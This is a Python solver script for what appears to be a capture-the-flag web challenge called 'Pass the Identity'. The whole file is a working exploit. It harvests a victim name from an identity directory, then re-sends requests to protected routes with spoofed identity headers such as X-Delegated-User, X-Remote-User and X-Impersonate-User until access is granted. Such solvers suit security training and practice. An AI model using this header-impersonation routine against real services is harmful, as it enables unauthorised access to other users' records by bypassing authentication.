"""D30 "Pass the Identity" (web-exploitation-day-28-pass-the-identity): trusted delegated-identity header.

Kit shape: /api/clues = {framework, feature_route, secondary_route, current_role, identity_directory_route};
GET identity_directory_route -> {"caller": "<role>", "records_owner": "<victim>"}; GET feature_route -> 403
{"error":"delegated_identity_rejected"} with `Vary: x-delegated-user`. Re-send the GET with
`X-Delegated-User: <records_owner>` -> {"effect":"delegated_identity_trusted","evidence":"proof_..."}.
Re-runnable (GET only) on any fresh target.
"""
import json
import re
import urllib.parse

from lib import websolve

HDRS = ("X-Delegated-User", "X-Forwarded-User", "X-Remote-User", "X-On-Behalf-Of", "X-Impersonate-User", "X-User")


def _route(cl, *pats):
    for p in pats:
        for k, v in cl.items():
            if re.search(p, k, re.I) and isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v):
                return v
    return None


def delegated(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    dir_r = _route(cl, r"identit|director")
    names, vary = [], []
    if dir_r:
        st, body, hdrs = websolve.fetch(urllib.parse.urljoin(base, dir_r))
        try:
            d = json.loads(body or "{}")
        except Exception:
            d = {}
        if isinstance(d, dict):
            for k in ("records_owner", "owner", "target", "victim", "executive", "admin"):
                if isinstance(d.get(k), str):
                    names.append(d[k])
            for k, v in d.items():
                if isinstance(v, str) and v not in names and not re.search(r"caller|current|self|me$", k, re.I):
                    names.append(v)
    names += [n for n in ("executive", "administrator", "admin") if n not in names]
    routes = [r for r in (_route(cl, r"feature"), _route(cl, r"secondary")) if r]
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        st, body, h = websolve.fetch(url)
        p = websolve.proof(body)
        if p:
            return p
        hv = ""
        try:
            hv = (h.get("vary") or h.get("Vary") or "") if h else ""
        except Exception:
            pass
        hdr_list = [x.strip() for x in hv.split(",") if x.strip().lower().startswith("x-")] or list(HDRS)
        for hn in hdr_list + [x for x in HDRS if x.lower() not in {y.lower() for y in hdr_list}]:
            for n in names:
                st, body, _ = websolve.fetch(url, headers={hn: n})
                p = websolve.proof(body)
                if p:
                    return p
    return None


KEY_MAP = [(r"identity_directory", "day30_web_pass_the_identity")]
HANDLERS = {"day30_web_pass_the_identity": delegated}
